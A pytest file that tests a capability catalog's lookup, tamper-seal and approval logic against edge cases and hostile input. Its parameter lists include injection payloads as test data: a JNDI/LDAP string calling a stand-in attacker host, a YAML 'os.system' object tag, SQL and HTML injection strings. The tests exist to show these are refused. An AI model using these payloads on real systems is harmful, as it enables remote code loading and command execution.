"""Edge cases for `CapabilityStore`: finding a capability, and what it refuses to serve.

`test_catalog.py` covers the happy path and the one headline refusal. These cover the places a
catalog is actually attacked or misused: ids that almost match, versions that sort the wrong way,
files that are not what they claim, edits that look harmless, and readers that arrive together.

Nothing here touches the network, a model or a browser, and everything is written under `tmp_path`.
"""

from __future__ import annotations

import re
import threading
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest

from cua.catalog.approvals import ApprovalStore
from cua.catalog.store import (
    CapabilityNotFoundError,
    CapabilityStore,
    CapabilityTamperedError,
)
from cua.catalog.toolspec import tool_definitions
from cua.domain.approval import ApprovalState
from cua.domain.capability import Capability
from cua.domain.serde import dump_capability, load_capability

FIXTURE = Path(__file__).resolve().parents[1] / "fixtures/capabilities/savings_balance.yaml"
ID = "corebank.member.savings_balance"
REF = f"{ID}@1.0.0"


def _base() -> Capability:
    return load_capability(FIXTURE.read_text(encoding="utf-8"))


def _variant(**changes: object) -> Capability:
    """The reference capability with fields changed and the seal cleared.

    `model_copy` skips validation on purpose: several tests need an artifact the *schema* would
    refuse, to prove the catalog copes with it rather than relying on the schema to have stopped it.
    """
    return _base().model_copy(update={**changes, "content_hash": ""})


def _publish(root: Path, name: str, capability: Capability) -> Path:
    """Write a sealed artifact the way the compiler does."""
    path = root / name
    path.write_text(dump_capability(capability), encoding="utf-8")
    return path


def _as_draft(text: str) -> str:
    return re.sub(r"^content_hash:.*$", "", text, flags=re.M).rstrip() + "\n"


@pytest.fixture
def root(tmp_path: Path) -> Path:
    path = tmp_path / "capabilities"
    path.mkdir()
    return path


@pytest.fixture
def store(root: Path) -> CapabilityStore:
    _publish(root, "savings.yaml", _base())
    return CapabilityStore(root=root)


# ---------------------------------------------------------------- version ordering


@pytest.mark.parametrize(
    ("versions", "newest"),
    [
        pytest.param(["1.9.0", "1.10.0", "1.2.0"], "1.10.0", id="1.10-beats-1.9"),
        pytest.param(["0.0.9", "0.0.10", "0.0.2"], "0.0.10", id="patch-digits"),
        pytest.param(["9.9.9", "10.0.0"], "10.0.0", id="major-digits"),
        pytest.param(["2.0.0", "1.99.99"], "2.0.0", id="major-beats-everything-below"),
        pytest.param(["1.0.0"], "1.0.0", id="single-version"),
    ],
)
def test_a_bare_id_resolves_to_the_numerically_newest_version(
    root: Path, versions: list[str], newest: str
) -> None:
    """A string sort puts 1.9.0 after 1.10.0, and an agent would silently get the older contract.

    Files are named so that directory order is the *reverse* of version order, which means a store
    that trusted the order it read them in would return the wrong answer.
    """
    ranked = sorted(versions, key=lambda v: tuple(int(part) for part in v.split(".")))
    for position, version in enumerate(reversed(ranked)):
        _publish(root, f"{position:02d}.yaml", _variant(version=version))

    store = CapabilityStore(root=root)
    assert store.resolve(ID).capability.version == newest
    assert store.load(ID).version == newest
    assert [e.capability.version for e in store.list()] == ranked


def test_the_listing_is_ordered_by_id_then_version_whatever_the_file_names_say(
    root: Path,
) -> None:
    for name, cap_id, version in [
        ("a.yaml", "zeta.op.run", "1.0.0"),
        ("b.yaml", "alpha.op.run", "1.10.0"),
        ("c.yaml", "alpha.op.run", "1.2.0"),
        ("d.yaml", "mid.op.run", "3.0.0"),
    ]:
        _publish(root, name, _variant(id=cap_id, version=version))

    assert [e.ref for e in CapabilityStore(root=root).list()] == [
        "alpha.op.run@1.2.0",
        "alpha.op.run@1.10.0",
        "mid.op.run@3.0.0",
        "zeta.op.run@1.0.0",
    ]


def test_an_exact_pin_ignores_newer_versions_and_the_bare_id_moves_when_one_arrives(
    root: Path,
) -> None:
    """Latest semantics are live: the same store instance sees a version published after it was
    made.

    A pin is the opposite guarantee -- a newer release must never change what `id@version` means.
    """
    _publish(root, "old.yaml", _variant(version="1.9.0"))
    store = CapabilityStore(root=root)
    assert store.resolve(ID).ref == f"{ID}@1.9.0"

    _publish(root, "new.yaml", _variant(version="1.10.0"))
    assert store.resolve(ID).ref == f"{ID}@1.10.0"
    assert store.resolve(f"{ID}@1.9.0").ref == f"{ID}@1.9.0"
    assert store.load(f"{ID}@1.9.0").version == "1.9.0"


@pytest.mark.parametrize(
    "bad_version",
    [
        pytest.param("1.0.0-rc.1", id="prerelease"),
        pytest.param("1.0.0-alpha", id="prerelease-word"),
        pytest.param("1.0.0+build.5", id="build-metadata"),
        pytest.param("v1.0.0", id="v-prefix"),
        pytest.param("1.0", id="two-parts"),
        pytest.param("1", id="one-part"),
        pytest.param("1.0.0.0", id="four-parts"),
        pytest.param("", id="empty"),
        pytest.param(" 1.0.0", id="leading-space"),
        pytest.param("1.0.0 ", id="trailing-space"),
        pytest.param("1.0.0\n", id="trailing-newline"),
        pytest.param(
            "١.٠.٠",
            id="arabic-indic-digits",
        ),
        pytest.param(
            "１.０.０",
            id="fullwidth-digits",
        ),
        pytest.param(
            "1.0.٠",
            id="mixed-ascii-and-non-ascii-digits",
        ),
    ],
)
def test_a_version_that_is_not_plain_semver_is_unreadable_never_ordered(
    root: Path, bad_version: str
) -> None:
    """Prerelease ordering is a judgement call the catalog does not make: it refuses the file.

    It stays visible (named in `unreadable`, and in a miss) rather than being silently treated as
    newer or older than a real release.
    """
    _publish(root, "good.yaml", _variant(version="1.0.0"))
    bad_path = _publish(root, "bad.yaml", _variant(version=bad_version))
    store = CapabilityStore(root=root)

    assert [e.ref for e in store.list()] == [REF]
    assert [path for path, _ in store.unreadable] == [bad_path]
    assert store.resolve(ID).ref == REF

    with pytest.raises(CapabilityNotFoundError) as raised:
        store.resolve(f"{ID}@{bad_version}")
    assert "bad.yaml (unreadable:" in str(raised.value)


# ---------------------------------------------------------------------- lookup keys


@pytest.mark.parametrize(
    "wanted",
    [
        pytest.param("", id="empty"),
        pytest.param("   ", id="whitespace-only"),
        pytest.param(f"{ID} ", id="trailing-space"),
        pytest.param(f" {ID}", id="leading-space"),
        pytest.param(f"{ID}\n", id="trailing-newline"),
        pytest.param(ID.upper(), id="wrong-case"),
        pytest.param("corebank.member", id="id-prefix"),
        pytest.param("corebank.member.*", id="glob"),
        pytest.param(".*", id="regex"),
        pytest.param(f"{ID}@", id="empty-version"),
        pytest.param("@1.0.0", id="empty-id"),
        pytest.param("@", id="bare-at"),
        pytest.param(f"{ID}@1", id="one-part-version"),
        pytest.param(f"{ID}@1.0", id="two-part-version"),
        pytest.param(f"{ID}@^1.0.0", id="caret-range"),
        pytest.param(f"{ID}@latest", id="tag"),
        pytest.param(f"{ID}@1.0.0 ", id="version-trailing-space"),
        pytest.param(f"{ID}@1.0.0@1.0.0", id="two-at-signs"),
        pytest.param(f"{ID}@١.0.0", id="non-ascii-digit-in-version"),
        pytest.param(ID.replace("c", "с", 1), id="cyrillic-homoglyph-in-id"),
        pytest.param(ID.replace(".", ".​", 1), id="zero-width-space-in-id"),
        pytest.param(f"{ID}́", id="combining-mark-after-id"),
    ],
)
def test_lookup_is_exact_with_no_prefix_range_wildcard_or_unicode_forgiveness(
    store: CapabilityStore, wanted: str
) -> None:
    """Every near miss is a miss. Forgiving lookup would hand an agent a capability it did not name.

    Especially the lookalikes: a homoglyph or an invisible character in a requested id must never
    resolve to the real one, or an attacker who can influence the request chooses the tool.
    """
    with pytest.raises(CapabilityNotFoundError):
        store.resolve(wanted)
    with pytest.raises(CapabilityNotFoundError):
        store.load(wanted)


@pytest.mark.parametrize(
    "wanted",
    [
        pytest.param("' OR '1'='1", id="sql"),
        pytest.param("{0.__class__}", id="format-string"),
        pytest.param("{wanted} {available}", id="format-fields-of-the-message-itself"),
        pytest.param("%s%s%s%n", id="printf"),
        pytest.param("<script>alert(1)</script>", id="html"),
        pytest.param("${jndi:ldap://attacker.invalid/a}", id="template-injection"),
        pytest.param("line1\nline2\r\nline3", id="log-forging-newlines"),
        pytest.param("\x1b[31mred", id="terminal-escape"),
        pytest.param("a" * 10_000, id="very-long"),
    ],
)
def test_injection_shaped_lookups_are_inert_and_the_miss_stays_on_one_line(
    store: CapabilityStore, wanted: str
) -> None:
    """The miss is reported with the request escaped, so it cannot forge a second log line.

    The message is also a place a caller might reflect straight into a terminal or a web page, so
    control characters in the request must arrive escaped, not raw.
    """
    with pytest.raises(CapabilityNotFoundError) as raised:
        store.resolve(wanted)

    error = raised.value
    assert error.wanted == wanted
    assert repr(wanted) in str(error)
    assert "\n" not in str(error)
    assert "\r" not in str(error)
    assert "\x1b" not in str(error)
    assert error.available == [REF], "the miss still says what the catalog does hold"


def test_a_path_is_never_a_lookup_key(tmp_path: Path, root: Path) -> None:
    """Lookup is by id. A path to a perfectly valid artifact outside the root finds nothing there,
    and the miss does not disclose what lives outside the catalog."""
    outside = tmp_path / "outside"
    outside.mkdir()
    _publish(outside, "elsewhere.yaml", _variant(id="evil.other.cap"))
    _publish(root, "inside.yaml", _base())
    store = CapabilityStore(root=root)

    for wanted in [
        "../outside/elsewhere",
        "../outside/elsewhere.yaml",
        str(outside / "elsewhere.yaml"),
        "..\\outside\\elsewhere",
        "./inside.yaml",
        "inside.yaml",
        "inside",
        "evil.other.cap",
        "evil.other.cap@1.0.0",
    ]:
        with pytest.raises(CapabilityNotFoundError) as raised:
            store.load(wanted)
        assert raised.value.available == [REF], wanted


def test_a_miss_and_a_refusal_are_different_kinds_of_error() -> None:
    """The CLI and the console catch `(LookupError, ValueError)`. The split matters because
    "it is not there" must never be handled as "it is there but refused", or the other way round."""
    assert issubclass(CapabilityNotFoundError, LookupError)
    assert not issubclass(CapabilityNotFoundError, ValueError)
    assert issubclass(CapabilityTamperedError, ValueError)
    assert not issubclass(CapabilityTamperedError, LookupError)


def test_an_empty_or_missing_or_non_directory_root_is_an_empty_catalog(tmp_path: Path) -> None:
    empty = tmp_path / "empty"
    empty.mkdir()
    a_file = tmp_path / "file.yaml"
    a_file.write_text("not a directory", encoding="utf-8")

    for root in (empty, tmp_path / "missing", a_file):
        store = CapabilityStore(root=root)
        assert store.list() == []
        with pytest.raises(CapabilityNotFoundError, match="holds nothing"):
            store.load(ID)


def test_only_top_level_yaml_files_are_catalog_entries(store: CapabilityStore) -> None:
    """Approval records, backups, notes and nested directories share the folder but are not
    capabilities -- and none of them may show up as an unreadable artifact either."""
    text = (store.root / "savings.yaml").read_text(encoding="utf-8")
    (store.root / "nested").mkdir()
    (store.root / "nested" / "deep.yaml").write_text(text.replace(ID, "deep.cap.x"), "utf-8")
    (store.root / "savings.yaml.bak").write_text(text, encoding="utf-8")
    (store.root / "notes.md").write_text(text, encoding="utf-8")
    ApprovalStore(root=store.root, evals_root=store.root).record(
        ref=REF, content_hash="sha256:" + "0" * 64, state=ApprovalState.REJECTED, by="r"
    )

    assert [e.ref for e in store.list()] == [REF]
    assert store.unreadable == []


def test_two_files_claiming_one_ref_are_both_listed_and_resolution_is_stable(root: Path) -> None:
    """Nothing is silently dropped, the choice does not wobble between calls, and an approval --
    which is pinned to content -- can cover only one of the two."""
    _publish(root, "a.yaml", _variant(title="Variant A"))
    _publish(root, "b.yaml", _variant(title="Variant B"))
    store = CapabilityStore(root=root)

    entries = store.list()
    assert [e.ref for e in entries] == [REF, REF]
    assert {e.capability.title for e in entries} == {"Variant A", "Variant B"}

    chosen = {store.resolve(ID).capability.content_hash for _ in range(5)}
    assert len(chosen) == 1

    ApprovalStore(root=root, evals_root=root).record(
        ref=REF,
        content_hash=entries[0].capability.content_hash,
        state=ApprovalState.APPROVED,
        by="reviewer",
    )
    approved = [e for e in store.list() if e.approval is ApprovalState.APPROVED]
    assert [e.path for e in approved] == [entries[0].path]


# ------------------------------------------------------------- files that are not artifacts


@pytest.mark.parametrize(
    "content",
    [
        pytest.param(b"\xff\xfe\x00\x01 not utf-8", id="binary"),
        pytest.param(b"", id="empty"),
        pytest.param(b"  \n\t\n", id="whitespace-only"),
        pytest.param(b"- a\n- b\n", id="yaml-list"),
        pytest.param(b"just some text", id="scalar"),
        pytest.param(b"a: *nope\n", id="alias-without-anchor"),
        pytest.param(b"id: x\nid: y\n  broken: : :\n", id="syntax-error"),
        pytest.param(b"[" * 6000 + b"]" * 6000, id="absurdly-nested"),
        pytest.param(None, id="directory-named-like-an-artifact"),
    ],
)
def test_a_hostile_file_is_reported_unreadable_and_does_not_hide_its_neighbours(
    store: CapabilityStore, content: bytes | None
) -> None:
    target = store.root / "hostile.yaml"
    if content is None:
        target.mkdir()
    else:
        target.write_bytes(content)

    assert [e.ref for e in store.list()] == [REF]
    assert [path for path, _ in store.unreadable] == [target]
    (_, why) = store.unreadable[0]
    assert why and "\n" not in why, "one line, so it can be shown beside the file name"
    assert store.load(ID).version == "1.0.0"


def test_a_yaml_object_tag_is_refused_and_never_executed(
    store: CapabilityStore, tmp_path: Path
) -> None:
    """The catalog reads files people can edit. A constructor tag must be data, not code."""
    marker = tmp_path / "executed"
    (store.root / "payload.yaml").write_text(
        f"!!python/object/apply:os.system ['echo pwned > {marker}']\n", encoding="utf-8"
    )

    assert [e.ref for e in store.list()] == [REF]
    assert [p.name for p, _ in store.unreadable] == ["payload.yaml"]
    assert not marker.exists()


@pytest.mark.parametrize(
    "content",
    [
        pytest.param("not-a-real-secret-token-fixture", id="scalar-document"),
        pytest.param("secret: not-a-real-secret-token-fixture\nsecret: : :", id="syntax-error"),
    ],
)
def test_a_broken_file_is_named_in_a_miss_without_echoing_what_was_in_it(
    store: CapabilityStore, content: str
) -> None:
    """A typo and a broken artifact must not produce the same message -- and the broken one must
    not become a way to read a file's contents through an error."""
    (store.root / "broken.yaml").write_text(content, encoding="utf-8")

    with pytest.raises(CapabilityNotFoundError) as raised:
        store.resolve("corebank.wire.transfer")

    assert "broken.yaml (unreadable:" in str(raised.value)
    assert "hunter2" not in str(raised.value)
    assert REF in raised.value.available


def test_the_unreadable_list_describes_the_latest_listing_only(store: CapabilityStore) -> None:
    broken = store.root / "broken.yaml"
    broken.write_text("this: is: not: a: capability", encoding="utf-8")
    store.list()
    assert [p.name for p, _ in store.unreadable] == ["broken.yaml"]

    broken.unlink()
    store.list()
    assert store.unreadable == [], "a stale entry would blame a file that is gone"


# ----------------------------------------------------------- tampering and seals


def _replace_once(old: str, new: str) -> Callable[[str], str]:
    def edit(text: str) -> str:
        assert old in text, f"the reference artifact no longer contains {old!r}"
        return text.replace(old, new, 1)

    return edit


def _edit_hash(rewrite: Callable[[str], str]) -> Callable[[str], str]:
    def edit(text: str) -> str:
        return re.sub(
            r"^content_hash: (.*)$",
            lambda match: f"content_hash: {rewrite(match.group(1))}",
            text,
            flags=re.M,
        )

    return edit


IN_PLACE_EDITS = {
    "title": _replace_once("savings balance\n", "CHECKING balance\n"),
    "description-on-a-continuation-line": _replace_once(
        "retrieve the member record", "delete the member record"
    ),
    "risk-downgraded": _replace_once("risk: elevated", "risk: safe"),
    "input-pattern-loosened": _replace_once("pattern: ^[0-9]{4,10}$", "pattern: .*"),
    "allowlist-widened": _replace_once("- '{base_url}'", "- '*'"),
    "version-bumped-in-place": _replace_once("\nversion: 1.0.0\n", "\nversion: 1.0.1\n"),
    "id-renamed": _replace_once(f"\nid: {ID}\n", "\nid: corebank.member.checking_balance\n"),
    "double-space-inside-a-value": _replace_once("Look up a member's", "Look up a  member's"),
    "non-breaking-space": _replace_once("Look up a member's", "Look up a member's"),
    "cyrillic-homoglyph": _replace_once("Look up a member's", "Look up а member's"),
    "zero-width-space": _replace_once("savings balance\n", "savings​ balance\n"),
    "typographic-apostrophe": _replace_once("member's savings", "member’s savings"),
    "hash-replaced-by-another-hash": _edit_hash(lambda _: "sha256:" + "0" * 64),
    "hash-upper-cased": _edit_hash(lambda h: h.upper().replace("SHA256", "sha256")),
    "hash-prefix-dropped": _edit_hash(lambda h: h.removeprefix("sha256:")),
    "hash-truncated": _edit_hash(lambda h: h[:-1]),
    "hash-padded-inside-quotes": _edit_hash(lambda h: f"'{h}  '"),
}


@pytest.mark.parametrize("edit", IN_PLACE_EDITS.values(), ids=IN_PLACE_EDITS.keys())
def test_every_in_place_edit_is_tampering_and_is_refused_but_still_listed(
    store: CapabilityStore, edit: Callable[[str], str]
) -> None:
    """The hash covers what the file *means*, so a one-character change anywhere -- including ones
    a reviewer cannot see -- is caught, and so is editing the hash itself."""
    path = store.root / "savings.yaml"
    before = path.read_text(encoding="utf-8")
    after = edit(before)
    assert after != before
    path.write_text(after, encoding="utf-8")

    (entry,) = store.list()
    assert entry.state == "TAMPERED", "an operator is told, not told it does not exist"
    assert entry.approval is ApprovalState.DRAFT

    with pytest.raises(CapabilityTamperedError) as raised:
        store.load(entry.ref)
    assert entry.ref in str(raised.value)
    assert str(path) in str(raised.value)


NON_SEMANTIC_EDITS = {
    "comment-appended": lambda text: text + "\n# reviewed by nobody\n",
    "comment-prepended": lambda text: "# a header comment\n" + text,
    "trailing-spaces-on-every-line": lambda text: "\n".join(
        f"{line}   " for line in text.split("\n")
    ),
    "blank-lines-between-top-level-keys": lambda text: re.sub(r"^(\w)", r"\n\1", text, flags=re.M),
    "document-start-marker": lambda text: "---\n" + text,
    "windows-line-endings": lambda text: text.replace("\n", "\r\n"),
}


@pytest.mark.parametrize("edit", NON_SEMANTIC_EDITS.values(), ids=NON_SEMANTIC_EDITS.keys())
def test_an_edit_that_changes_no_content_does_not_break_the_seal(
    store: CapabilityStore, edit: Callable[[str], str]
) -> None:
    """The counterpart to the test above. A seal that flagged a reflowed file would train
    operators to ignore `TAMPERED`, which is worse than not having one."""
    path = store.root / "savings.yaml"
    before = path.read_text(encoding="utf-8")
    path.write_bytes(edit(before).encode("utf-8"))

    (entry,) = store.list()
    assert entry.state == "sealed"
    assert store.load(ID).compute_hash() == _base().compute_hash()


def test_removing_the_seal_makes_a_draft_that_is_served_and_flagged(store: CapabilityStore) -> None:
    """Dropping the hash is how a hand-authored draft looks, so it is legitimate -- and visibly not
    sealed, which is the only defence available against someone deleting the line on purpose."""
    path = store.root / "savings.yaml"
    path.write_text(_as_draft(path.read_text(encoding="utf-8")), encoding="utf-8")

    (entry,) = store.list()
    assert entry.state == "draft"
    assert store.load(ID).content_hash == ""


def test_stripping_the_seal_from_an_approved_artifact_does_not_keep_the_approval(
    store: CapabilityStore,
) -> None:
    (entry,) = store.list()
    approvals = ApprovalStore(root=store.root, evals_root=store.root)
    approvals.record(
        ref=entry.ref,
        content_hash=entry.capability.content_hash,
        state=ApprovalState.APPROVED,
        by="reviewer",
    )
    assert store.list()[0].approval is ApprovalState.APPROVED

    entry.path.write_text(_as_draft(entry.path.read_text(encoding="utf-8")), encoding="utf-8")

    (stripped,) = store.list()
    assert stripped.state == "draft"
    assert stripped.approval is ApprovalState.DRAFT
    stored = approvals.load(entry.ref)
    assert stored is not None
    assert not stored.permits_unattended_replay(content_hash=stripped.capability.content_hash)


def test_an_unsealed_draft_cannot_be_approved_even_by_a_record_pinned_to_its_computed_hash(
    root: Path,
) -> None:
    """Approval needs content that is actually sealed. Computing the hash by hand and pinning a
    record to it does not make an unsealed artifact approvable."""
    path = root / "draft.yaml"
    path.write_text(_as_draft(dump_capability(_base())), encoding="utf-8")
    store = CapabilityStore(root=root)
    (entry,) = store.list()
    assert entry.state == "draft"

    ApprovalStore(root=root, evals_root=root).record(
        ref=entry.ref,
        content_hash=entry.capability.compute_hash(),
        state=ApprovalState.APPROVED,
        by="reviewer",
    )
    assert store.list()[0].approval is ApprovalState.DRAFT


# ---------------------------------------------------------------------------- unicode


UNICODE_TEXTS = [
    pytest.param("café é å", id="combining-marks"),
    pytest.param("שלום مرحبا latin", id="rtl-mixed"),
    pytest.param("a‍b​c⁠d", id="zero-width-joiner-space-word-joiner"),
    pytest.param("pay \U0001f4b0 \U0001f468‍\U0001f469‍\U0001f467", id="emoji-zwj"),
    pytest.param("аpple οnline", id="homoglyphs"),
    pytest.param("line sep para", id="unicode-line-separators"),
    pytest.param("tab\there", id="tab"),
    pytest.param("cr\rlf\ncrlf\r\nend", id="carriage-returns"),
    pytest.param("  padded both sides  ", id="padding"),
    pytest.param("key: value # not a comment", id="yaml-lookalike"),
    pytest.param("- dash\n- list", id="yaml-list-lookalike"),
    pytest.param("null", id="yaml-null-word"),
    pytest.param("yes", id="yaml-bool-word"),
    pytest.param("1234", id="yaml-int-lookalike"),
    pytest.param("---", id="yaml-document-marker"),
    pytest.param("{{template}} ${x} %s {0} {base_url}", id="template-syntax"),
    pytest.param("<script>alert(1)</script>", id="html"),
    pytest.param("word " * 20_000, id="very-long-line"),
    pytest.param("x\u0085y", id="next-line-u0085"),
]


@pytest.mark.parametrize("text", UNICODE_TEXTS)
def test_unicode_text_survives_sealing_and_reloading_byte_for_byte(root: Path, text: str) -> None:
    """Sealing writes YAML and the catalog reads it back; if those two disagree about a single code
    point, a freshly compiled artifact would be refused as tampered. The text is also what an agent
    reads, so it must come back unnormalised."""
    _publish(root, "u.yaml", _variant(title=text, description=text))
    store = CapabilityStore(root=root)

    (entry,) = store.list()
    assert entry.state == "sealed"
    capability = store.load(ID)
    assert capability.title == text
    assert capability.description == text
    assert capability.tool_schema()["description"] == text


# -------------------------------------------------------------------------- concurrency


def test_concurrent_readers_all_get_the_same_verified_capability(store: CapabilityStore) -> None:
    """Many agents look the catalog up at once against one shared store. A broken file next door
    makes each listing touch `unreadable`, the one piece of per-call state the store keeps."""
    (store.root / "broken.yaml").write_text("this: is: not: a: capability", encoding="utf-8")
    readers = 8
    barrier = threading.Barrier(readers)

    def read() -> list[str]:
        barrier.wait(timeout=30)
        return [store.load(ID).content_hash for _ in range(10)]

    with ThreadPoolExecutor(max_workers=readers) as pool:
        futures = [pool.submit(read) for _ in range(readers)]
        results = [future.result(timeout=60) for future in futures]

    assert {digest for hashes in results for digest in hashes} == {_base().compute_hash()}


def test_a_large_catalog_lists_completely_and_deterministically(root: Path) -> None:
    for index in range(60):
        _publish(root, f"cap-{index:03d}.yaml", _variant(id=f"bulk.op.cap{index:03d}"))

    first = [e.ref for e in CapabilityStore(root=root).list()]
    second = [e.ref for e in CapabilityStore(root=root).list()]

    assert len(first) == 60
    assert first == second == sorted(first)
    assert len(tool_definitions(CapabilityStore(root=root))) == 60
